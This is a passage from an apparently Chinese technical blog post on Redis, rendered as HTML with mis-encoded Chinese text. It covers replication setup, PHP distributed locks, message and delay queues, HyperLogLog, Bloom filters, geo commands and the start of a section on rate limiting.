class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/local/redis/redis.conf /usr/local/redis/redis<span class="number">.6380</span>.conf</span><br><span class="line"></span><br><span class="line">[root@localhost redis]# vim /etc/redis/redis.conf</span><br><span class="line">bind 0.0.0.0 # ç»‘å®šå…è®¸è®¿é—®çš„ipåœ°å€ï¼Œå¦‚æœ¬æœºæ¨¡æ‹Ÿä¸»ä»å¯ä¸æ”¹å˜å€¼ä»ä½¿ç”¨127.0.0.1</span><br><span class="line"></span><br><span class="line">[root@localhost redis]# vim /usr/local/redis/redis.6380.conf</span><br><span class="line">port 6380 # å°†ç«¯å£æ›´æ”¹ä¸º6380</span><br><span class="line">slaveof 127.0.0.1 6379 # æŒ‡å®šmaster ip port</span><br><span class="line"></span><br><span class="line">[root@localhost redis]# redis-server /usr/local/redis/redis.conf # å¯åŠ¨master</span><br><span class="line">[root@localhost redis]# redis-server /usr/local/redis/redis.6380.conf # å¯åŠ¨slave</span><br><span class="line">æŸ¥çœ‹ Master çŠ¶æ€</span><br><span class="line"></span><br><span class="line">[liubo@localhost ~]$ redis-cli -p <span class="number">6379</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; info</span><br><span class="line"># Server</span><br><span class="line">â€¦â€¦</span><br><span class="line"># Clients</span><br><span class="line">â€¦â€¦</span><br><span class="line"># Memory</span><br><span class="line">â€¦â€¦</span><br><span class="line"># Persistence</span><br><span class="line">â€¦â€¦</span><br><span class="line"># Stats</span><br><span class="line">â€¦â€¦</span><br><span class="line"># Replication # å…³æ³¨æ­¤åŒºåŸŸ</span><br><span class="line">role:master # å½“å‰è§’è‰²,master</span><br><span class="line">connected_slaves:1 # å·²è¿æ¥slaveï¼š1ä¸ª</span><br><span class="line">slave0:ip=127.0.0.1,port=6380,state=online,offset=56,lag=1 # slave0ä¿¡æ¯</span><br><span class="line">master_replid:<span class="number">7e3</span>b0e1accd31abaf58177160685d51952ea1e90</span><br><span class="line">master_replid2:<span class="number">0000000000000000000000000000000000000000</span></span><br><span class="line">master_repl_offset:<span class="number">56</span></span><br><span class="line">second_repl_offset:<span class="number">-1</span></span><br><span class="line">repl_backlog_active:<span class="number">1</span></span><br><span class="line">repl_backlog_size:<span class="number">1048576</span></span><br><span class="line">repl_backlog_first_byte_offset:<span class="number">1</span></span><br><span class="line">repl_backlog_histlen:<span class="number">56</span></span><br><span class="line"># CPU</span><br><span class="line">â€¦â€¦</span><br><span class="line"># Cluster</span><br><span class="line">â€¦â€¦</span><br><span class="line">æŸ¥çœ‹ Slave çŠ¶æ€</span><br><span class="line"></span><br><span class="line">[liubo@localhost ~]$ redis-cli -p <span class="number">6380</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; info</span><br><span class="line"># Server</span><br><span class="line">â€¦â€¦</span><br><span class="line"># Clients</span><br><span class="line">â€¦â€¦</span><br><span class="line"># Memory</span><br><span class="line">â€¦â€¦</span><br><span class="line"># Persistence</span><br><span class="line">â€¦â€¦</span><br><span class="line"># Stats</span><br><span class="line">â€¦â€¦</span><br><span class="line"># Replication # å…³æ³¨æ­¤åŒºåŸŸ</span><br><span class="line">role:slave # å½“å‰è§’è‰²,slave</span><br><span class="line">master_host:127.0.0.1 # masterç›¸å…³ä¿¡æ¯</span><br><span class="line">master_port:<span class="number">6379</span></span><br><span class="line">master_link_status:up # è¿æ¥masterçŠ¶æ€</span><br><span class="line">master_last_io_seconds_ago:<span class="number">4</span></span><br><span class="line">master_sync_in_progress:<span class="number">0</span></span><br><span class="line">slave_repl_offset:<span class="number">84</span></span><br><span class="line">slave_priority:<span class="number">100</span></span><br><span class="line">slave_read_only:<span class="number">1</span></span><br><span class="line">connected_slaves:<span class="number">0</span></span><br><span class="line">master_replid:<span class="number">7e3</span>b0e1accd31abaf58177160685d51952ea1e90</span><br><span class="line">master_replid2:<span class="number">0000000000000000000000000000000000000000</span></span><br><span class="line">master_repl_offset:<span class="number">84</span></span><br><span class="line">second_repl_offset:<span class="number">-1</span></span><br><span class="line">repl_backlog_active:<span class="number">1</span></span><br><span class="line">repl_backlog_size:<span class="number">1048576</span></span><br><span class="line">repl_backlog_first_byte_offset:<span class="number">1</span></span><br><span class="line">repl_backlog_histlen:<span class="number">84</span></span><br><span class="line"># CPU</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/index.php/articles/30765</span></span><br></pre></td></tr></table></figure>
<h3 id="åˆ†å¸ƒå¼é”"><a href="#åˆ†å¸ƒå¼é”" class="headerlink" title="åˆ†å¸ƒå¼é”"></a>åˆ†å¸ƒå¼é”</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">$ok = $redis-&gt;setNX($key, $value);</span><br><span class="line"><span class="keyword">if</span> ($ok) &#123;</span><br><span class="line">    <span class="comment">//è·å–åˆ°é”</span></span><br><span class="line">    ... do something ...</span><br><span class="line">    $redis-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$redis-&gt;multi();</span><br><span class="line">$redis-&gt;setNX($key, $value);</span><br><span class="line">$redis-&gt;expire($key, $ttl);</span><br><span class="line">$res = $redis-&gt;exec();</span><br><span class="line"><span class="keyword">if</span>($res[<span class="number">0</span>]) &#123;</span><br><span class="line">    <span class="comment">//è·å–åˆ°é”</span></span><br><span class="line">    ... do something ...</span><br><span class="line">    $redis-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line">$script = &lt;&lt;&lt;EOT</span><br><span class="line">    local key   = KEYS[1]</span><br><span class="line">    local value = KEYS[2]</span><br><span class="line">    local ttl   = KEYS[3]</span><br><span class="line"></span><br><span class="line">    local ok = redis.call('setnx', key, value)</span><br><span class="line"></span><br><span class="line">    if ok == 1 then</span><br><span class="line">    redis.call('expire', key, ttl)</span><br><span class="line">    end</span><br><span class="line">    return ok</span><br><span class="line">EOT;</span><br><span class="line"></span><br><span class="line">$res = $redis-&gt;eval($script, [$key,$val, $ttl], 3);</span><br><span class="line">if($res) &#123;</span><br><span class="line">    //è·å–åˆ°é”https://learnku.com/articles/30827</span><br><span class="line">    ... do something ...</span><br><span class="line">    $redis-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ok = $redis-&gt;set($key, $random, array('nx', 'ex' =&gt; $ttl));</span><br><span class="line"></span><br><span class="line">if ($ok) &#123;</span><br><span class="line">    //è·å–åˆ°é”</span><br><span class="line">    ... do something ...</span><br><span class="line">    if ($redis-&gt;get($key) == $random) &#123;</span><br><span class="line">        $redis-&gt;del($key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å¼•å…¥äº†ä¸€ä¸ªéšæœºæ•°ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢é€»è¾‘å¤„ç†æ—¶é—´è¿‡é•¿å¯¼è‡´é”çš„è¿‡æœŸæ—¶é—´å·²ç»å¤±æ•ˆï¼Œè¿™æ—¶å€™ä¸‹ä¸€ä¸ªè¯·æ±‚å°±è·å¾—äº†é”ï¼Œä½†æ˜¯å‰ä¸€ä¸ªè¯·æ±‚åœ¨é€»è¾‘å¤„ç†å®Œç›´æ¥åˆ é™¤äº†é”ã€‚</span><br><span class="line"></span><br><span class="line">é”ä¸»è¦ç”¨åœ¨å¹¶å‘è¯·æ±‚å¦‚ç§’æ€ç­‰åœºæ™¯ä¸­ï¼Œä»¥ä¸Šä¾¿æ˜¯ redis é”çš„å®ç°ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="å¼‚æ­¥æ¶ˆæ¯é˜Ÿåˆ—ä¸å»¶æ—¶é˜Ÿåˆ—"><a href="#å¼‚æ­¥æ¶ˆæ¯é˜Ÿåˆ—ä¸å»¶æ—¶é˜Ÿåˆ—" class="headerlink" title="å¼‚æ­¥æ¶ˆæ¯é˜Ÿåˆ—ä¸å»¶æ—¶é˜Ÿåˆ—"></a>å¼‚æ­¥æ¶ˆæ¯é˜Ÿåˆ—ä¸å»¶æ—¶é˜Ÿåˆ—</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‘é€æ¶ˆæ¯</span></span><br><span class="line">$redis-&gt;lPush($list, $value);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¶ˆè´¹æ¶ˆæ¯</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $msg = $redis-&gt;rPop($list);</span><br><span class="line">        <span class="keyword">if</span> (!$msg) &#123;</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//ä¸šåŠ¡å¤„ç†</span></span><br><span class="line">     </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">        echo $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">blpop/brpopåœ¨é˜Ÿåˆ—æ²¡æœ‰æ•°æ®çš„æ—¶å€™ï¼Œä¼šç«‹å³è¿›å…¥ä¼‘çœ çŠ¶æ€ï¼Œä¸€æ—¦æ•°æ®åˆ°æ¥ï¼Œåˆ™ç«‹åˆ»é†’è¿‡æ¥ã€‚æ¶ˆæ¯çš„å»¶è¿Ÿå‡ ä¹ä¸ºé›¶ã€‚ç”¨blpop/brpopæ›¿ä»£å‰é¢çš„lpop/rpopï¼Œå°±å®Œç¾è§£å†³äº†ä¸Šé¢çš„é—®é¢˜ã€‚</span><br><span class="line">å°†æœ‰åºé›†åˆçš„valueè®¾ç½®ä¸ºæˆ‘ä»¬çš„æ¶ˆæ¯ä»»åŠ¡ï¼ŒæŠŠvalueçš„scoreè®¾ç½®ä¸ºæ¶ˆæ¯çš„åˆ°æœŸæ—¶é—´ï¼Œç„¶åè½®è¯¢è·å–æœ‰åºé›†åˆçš„ä¸­çš„åˆ°æœŸæ¶ˆæ¯è¿›è¡Œå¤„ç†ã€‚</span><br><span class="line">å®ç°ä»£ç å¦‚ä¸‹ï¼š</span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line">$redis-&gt;zAdd($delayQueue,$tts, $value);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $msg = $redis-&gt;zRangeByScore($delayQueue,<span class="number">0</span>,time(),<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$msg)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//åˆ é™¤æ¶ˆæ¯</span></span><br><span class="line">        $ok = $redis.zrem($delayQueue,$msg);</span><br><span class="line">        <span class="keyword">if</span>($ok)&#123;</span><br><span class="line">            <span class="comment">//ä¸šåŠ¡å¤„ç†</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(\Exception $e) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30826</span></span><br><span class="line">HyperLogLog ç®—æ³•æ˜¯ä¸€ç§éå¸¸å·§å¦™çš„è¿‘ä¼¼ç»Ÿè®¡æµ·é‡å»é‡å…ƒç´ æ•°é‡çš„ç®—æ³•ã€‚å®ƒå†…éƒ¨ç»´æŠ¤äº† <span class="number">16384</span> ä¸ªæ¡¶ï¼ˆbucketï¼‰æ¥è®°å½•å„è‡ªæ¡¶çš„å…ƒç´ æ•°é‡ã€‚å½“ä¸€ä¸ªå…ƒç´ åˆ°æ¥æ—¶ï¼Œå®ƒä¼šæ•£åˆ—åˆ°å…¶ä¸­ä¸€ä¸ªæ¡¶ï¼Œä»¥ä¸€å®šçš„æ¦‚ç‡å½±å“è¿™ä¸ªæ¡¶çš„è®¡æ•°å€¼ã€‚å› ä¸ºæ˜¯æ¦‚ç‡ç®—æ³•ï¼Œæ‰€ä»¥å•ä¸ªæ¡¶çš„è®¡æ•°å€¼å¹¶ä¸å‡†ç¡®ï¼Œä½†æ˜¯å°†æ‰€æœ‰çš„æ¡¶è®¡æ•°å€¼è¿›è¡Œè°ƒåˆå‡å€¼ç´¯åŠ èµ·æ¥ï¼Œç»“æœå°±ä¼šéå¸¸æ¥è¿‘çœŸå®çš„è®¡æ•°å€¼ã€‚</span><br><span class="line"></span><br><span class="line">pfadd å¢åŠ è®¡æ•°</span><br><span class="line">pfcount è·å–è®¡æ•°</span><br><span class="line">HyperLogLog è¿˜æä¾›äº†ç¬¬ä¸‰ä¸ªæŒ‡ä»¤ pfmergeï¼Œç”¨äºå°†å¤šä¸ª pf è®¡æ•°å€¼ç´¯åŠ åœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªæ–°çš„ pf å€¼ã€‚</span><br><span class="line"></span><br><span class="line">æ¯”å¦‚åœ¨ç½‘ç«™ä¸­æˆ‘ä»¬æœ‰ä¸¤ä¸ªå†…å®¹å·®ä¸å¤šçš„é¡µé¢ï¼Œè¿è¥éœ€è¦å°†ä¸¤ä¸ªé¡µé¢çš„æ•°æ®è¿›è¡Œåˆå¹¶ã€‚å…¶ä¸­é¡µé¢çš„ UV è®¿é—®é‡ä¹Ÿéœ€è¦åˆå¹¶ï¼Œè¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨ pfmerge</span><br><span class="line">å¸ƒéš†è¿‡æ»¤å™¨å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªä¸æ€ä¹ˆç²¾ç¡®çš„ set ç»“æ„</span><br><span class="line">&gt; docker pull redislabs/rebloom # æ‹‰å–é•œåƒ</span><br><span class="line">&gt; docker run -p 6379:6379 redislabs/rebloom # è¿è¡Œå®¹å™¨</span><br><span class="line">&gt; redis-cli # è¿æ¥å®¹å™¨ä¸­çš„ redis æœåŠ¡</span><br><span class="line">bf.add æ·»åŠ å…ƒç´ </span><br><span class="line">bf.exists æŸ¥è¯¢å…ƒç´ æ˜¯å¦å­˜åœ¨</span><br><span class="line">bf.madd ä¸€æ¬¡æ·»åŠ å¤šä¸ªå…ƒç´ </span><br><span class="line">bf.mexists ä¸€æ¬¡æŸ¥è¯¢å¤šä¸ªå…ƒç´ æ˜¯å¦å­˜åœ¨</span><br><span class="line"></span><br><span class="line">ä¸»è¦æ˜¯è§£å†³å¤§è§„æ¨¡æ•°æ®ä¸‹ä¸éœ€è¦ç²¾ç¡®è¿‡æ»¤çš„åœºæ™¯ï¼Œå¦‚æ£€æŸ¥åƒåœ¾é‚®ä»¶åœ°å€ï¼Œçˆ¬è™« URL åœ°å€å»é‡ï¼Œè§£å†³ç¼“å­˜ç©¿é€é—®é¢˜ç­‰ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="geo"><a href="#geo" class="headerlink" title="geo"></a>geo</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">æ·»åŠ æ­å·åŒ—äº¬ä¸Šæµ·çš„åœ°ç†ä½ç½®</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geoadd city <span class="number">120.20000</span> <span class="number">30.26667</span> hangzhou  <span class="number">116.41667</span> <span class="number">39.91667</span> beijing <span class="number">121.47</span> <span class="number">31.23</span> shanghai</span><br><span class="line">geopos æŒ‡ä»¤å¯ä»¥è·å–é›†åˆä¸­ä»»æ„å…ƒç´ çš„ç»çº¬åº¦åæ ‡ï¼Œå¯ä»¥ä¸€æ¬¡è·å–å¤šä¸ªã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geopos city hangzhou  beijing shanghai</span><br><span class="line"><span class="number">1</span>) <span class="number">1</span>) <span class="string">"120.15000075101852417"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"30.2800007575645509"</span></span><br><span class="line"><span class="number">2</span>) <span class="number">1</span>) <span class="string">"116.39999896287918091"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"39.90000009167092543"</span></span><br><span class="line"><span class="number">3</span>) <span class="number">1</span>) <span class="string">"121.47000163793563843"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"31.22999903975783553"</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geopos city hangzhou</span><br><span class="line"><span class="number">1</span>) <span class="number">1</span>) <span class="string">"120.15000075101852417"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"30.2800007575645509"</span></span><br><span class="line">è®¡ç®—è·ç¦»</span><br><span class="line"></span><br><span class="line">è·ç¦»å•ä½å¯ä»¥æ˜¯ mã€kmã€mlã€ftï¼Œåˆ†åˆ«ä»£è¡¨ç±³ã€åƒç±³ã€è‹±é‡Œå’Œå°ºã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geodist city shanghai hangzhou  km</span><br><span class="line"><span class="string">"164.5694"</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geodist city beijing  hangzhou  km</span><br><span class="line"><span class="string">"1122.7998"</span></span><br><span class="line"></span><br><span class="line">ä¾‹å¦‚æŸ¥æ‰¾è·ç¦»æ­å·<span class="number">300</span>kmä»¥å†…çš„åŸå¸‚çš„<span class="number">10</span>ä¸ªåŸå¸‚æŒ‰è·ç¦»æ’åº</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; GEORADIUSBYMEMBER city hangzhou <span class="number">300</span> km WITHCOORD WITHDIST WITHHASH  ASC COUNT <span class="number">10</span></span><br><span class="line"><span class="number">1</span>) <span class="number">1</span>) <span class="string">"hangzhou"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"0.0000"</span></span><br><span class="line">   <span class="number">3</span>) (integer) <span class="number">4054134257390783</span></span><br><span class="line">   <span class="number">4</span>) <span class="number">1</span>) <span class="string">"120.15000075101852417"</span></span><br><span class="line">      <span class="number">2</span>) <span class="string">"30.2800007575645509"</span></span><br><span class="line"><span class="number">2</span>) <span class="number">1</span>) <span class="string">"shanghai"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"164.5694"</span></span><br><span class="line">   <span class="number">3</span>) (integer) <span class="number">4054803462927619</span></span><br><span class="line">   <span class="number">4</span>) <span class="number">1</span>) <span class="string">"121.47000163793563843"</span></span><br><span class="line">      <span class="number">2</span>) <span class="string">"31.22999903975783553"</span></span><br><span class="line">åœ¨ç»™å®šä»¥ä¸‹å¯é€‰é¡¹æ—¶ï¼Œ å‘½ä»¤ä¼šè¿”å›é¢å¤–çš„ä¿¡æ¯ï¼š</span><br><span class="line"></span><br><span class="line">WITHDIST ï¼š åœ¨è¿”å›ä½ç½®å…ƒç´ çš„åŒæ—¶ï¼Œ å°†ä½ç½®å…ƒç´ ä¸ä¸­å¿ƒä¹‹é—´çš„è·ç¦»ä¹Ÿä¸€å¹¶è¿”å›ã€‚ è·ç¦»çš„å•ä½å’Œç”¨æˆ·ç»™å®šçš„èŒƒå›´å•ä½ä¿æŒä¸€è‡´ã€‚</span><br><span class="line">WITHCOORD ï¼š å°†ä½ç½®å…ƒç´ çš„ç»åº¦å’Œç»´åº¦ä¹Ÿä¸€å¹¶è¿”å›ã€‚</span><br><span class="line">WITHHASH ï¼š ä»¥ <span class="number">52</span> ä½æœ‰ç¬¦å·æ•´æ•°çš„å½¢å¼ï¼Œ è¿”å›ä½ç½®å…ƒç´ ç»è¿‡åŸå§‹ geohash ç¼–ç çš„æœ‰åºé›†åˆåˆ†å€¼ã€‚</span><br><span class="line">ASC ï¼š æ ¹æ®ä¸­å¿ƒçš„ä½ç½®ï¼Œ æŒ‰ç…§ä»è¿‘åˆ°è¿œçš„æ–¹å¼è¿”å›ä½ç½®å…ƒç´ ã€‚DESC ï¼š æ ¹æ®ä¸­å¿ƒçš„ä½ç½®ï¼Œ æŒ‰ç…§ä»è¿œåˆ°è¿‘çš„æ–¹å¼è¿”å›ä½ç½®å…ƒç´ ã€‚</span><br><span class="line">è·å–å…ƒç´ çš„ hash å€¼</span><br><span class="line"></span><br><span class="line">å¯èƒ½ä½ è¿˜æ³¨æ„åˆ°æœ‰ä¸€ä¸ªå‘½ä»¤ GEOHASH, é‚£ä»–æ˜¯åšä»€ä¹ˆçš„å‘¢</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geohash city hangzhou</span><br><span class="line"><span class="number">1</span>) <span class="string">"wtmkq069cc0"</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geohash city beijing</span><br><span class="line"><span class="number">1</span>) <span class="string">"wx4fbxxfke0"</span></span><br><span class="line">è¿”å›çš„å…¶å®æ˜¯å…ƒç´ çš„ç»çº¬åº¦ç»è¿‡ goehash è®¡ç®—åçš„ base32 ç¼–ç å­—ç¬¦ä¸²</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//geohash.org/wtmkq069cc0  è¿›è¡Œç›´æ¥å®šä½ </span></span><br><span class="line">å…¶å­˜å‚¨ç»“æ„ä¸»è¦ä½¿ç”¨çš„æ˜¯ Redis çš„æœ‰åºç»“æ„ï¼Œå…¶ score æ˜¯ GeoHash çš„ <span class="number">52</span> ä½æ•´æ•°å€¼</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ZRANGE city <span class="number">0</span> <span class="number">-1</span> WITHSCORES</span><br><span class="line"><span class="number">1</span>) <span class="string">"hangzhou"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"4054134257390783"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"shanghai"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"4054803462927619"</span></span><br><span class="line"><span class="number">5</span>) <span class="string">"beijing"</span></span><br><span class="line"><span class="number">6</span>) <span class="string">"4069885360207904"</span></span><br></pre></td></tr></table></figure>
<h3 id="é™æµ"><a href="#é™æµ" class="headerlink" title="é™æµ"></a>é™æµ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹æœ‰ä¸‰æŠŠåˆ©å™¨ä¿æŠ¤ç³»ç»Ÿï¼šç¼“å­˜ã€é™çº§ã€å’Œé™æµã€‚ç¼“å­˜çš„ç›®çš„æ˜¯æå‡ç³»ç»Ÿçš„è®¿é—®ä½ é€Ÿåº¦å’Œå¢å¤§ç³»ç»Ÿèƒ½å¤„ç†çš„å®¹é‡ï¼›é™çº§æ˜¯å½“æœåŠ¡å‡ºé—®é¢˜æˆ–å½±å“åˆ°æ ¸å¿ƒæµç¨‹çš„æ€§èƒ½åˆ™éœ€è¦æš‚æ—¶å±è”½æ‰ã€‚è€Œæœ‰äº›åœºæ™¯åˆ™éœ€è¦é™åˆ¶å¹¶å‘è¯·æ±‚é‡ï¼Œå¦‚ç§’æ€ã€æŠ¢è´­ã€å‘å¸–ã€è¯„è®ºã€æ¶æ„çˆ¬è™«ç­‰ã€‚</span><br><span class="line"></span><br><span class="line">é™æµç®—æ³•</span><br><span 